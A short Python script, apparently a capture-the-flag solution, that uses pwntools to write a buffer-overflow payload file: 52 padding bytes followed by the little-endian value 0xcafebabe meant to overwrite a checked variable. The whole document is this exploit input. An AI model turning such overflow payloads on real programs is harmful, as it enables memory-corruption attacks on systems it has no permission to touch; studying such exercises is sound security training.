from os import write
import pwn

offset = 'A' * 52 
pwn.context.endian = 'little'
payload = pwn.p32(0xcafebabe)

f = open('payload', 'wb')
f.write(offset.encode())
f.write(payload)
f.close()





